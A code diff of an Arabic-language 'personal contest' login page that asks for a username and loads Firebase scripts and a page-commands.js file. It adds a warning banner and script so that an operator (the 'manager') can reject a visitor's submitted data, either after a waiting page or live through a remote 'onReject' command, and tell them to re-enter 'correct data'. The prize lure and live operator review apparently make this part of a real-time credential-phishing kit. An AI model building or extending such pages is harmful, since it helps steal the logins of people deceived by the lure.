@@ -25,6 +25,8 @@
     .option input:focus{box-shadow:none}
     .error{display:none;color:#c62828;text-align:right;font-size:11px;margin-top:7px}
     .error.show{display:block}
+    .reject-warning{display:none;background:#fdecec;border:1px solid #f3b6b6;color:#c62828;border-radius:9px;padding:10px 12px;font-size:12px;font-weight:700;text-align:right;margin:0 0 12px}
+    .reject-warning.show{display:block}
     .submit{width:100%;height:48px;margin-top:15px;border:0;border-radius:28px;background:#bfc4c8;color:#fff;font:800 16px Cairo,sans-serif;cursor:not-allowed;transition:.15s ease}
     .submit.active{background:var(--pink);cursor:pointer}
     .submit.active:hover{background:var(--pink-hover)}
@@ -52,6 +54,7 @@
   <main class="card">
     <h1>قم بتسجيل الدخول للوصول الى المسابقة<br>الشخصية الخاصة بك</h1>
     <p class="intro">ادخل اسم المستخدم الخاص بك لتسجيل الدخول</p>
+    <div class="reject-warning" id="rejectWarning" role="alert">يرجى إدخال بيانات صحيحه واعادة المحاولة</div>
     <form id="usernameForm">
       <div class="field">
         <label for="username">اسم المستخدم</label>
@@ -88,9 +91,30 @@
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-  <script src="/assets/js/firebase-client.js?v=12"></script>
+  <script src="/assets/js/firebase-client.js?v=13"></script>
   <script src="/assets/js/page-commands.js?v=5"></script>
   <script>
+    // رسالة الرفض: تظهر إذا عاد العميل من صفحة الانتظار بعد رفض المدير
+    (function(){
+      var warn = document.getElementById('rejectWarning');
+      var msg = null;
+      try { msg = sessionStorage.getItem('prizeRejectMessage'); } catch (e) {}
+      if (msg) {
+        warn.textContent = msg;
+        warn.classList.add('show');
+        try { sessionStorage.removeItem('prizeRejectMessage'); } catch (e) {}
+      }
+    })();
+    // رفض مباشر أثناء وجود العميل في هذه الصفحة (لو رفض المدير مبكراً)
+    if (window.listenForPageCommands) {
+      window.listenForPageCommands({
+        onReject: function () {
+          var warn = document.getElementById('rejectWarning');
+          warn.textContent = 'يرجى إدخال بيانات صحيحه واعادة المحاولة';
+          warn.classList.add('show');
+        }
+      });
+    }
     document.getElementById("forgotUsername").addEventListener("click",e=>e.preventDefault());
     const usernameInput=document.getElementById("username");
     const continueBtn=document.getElementById("continueBtn");
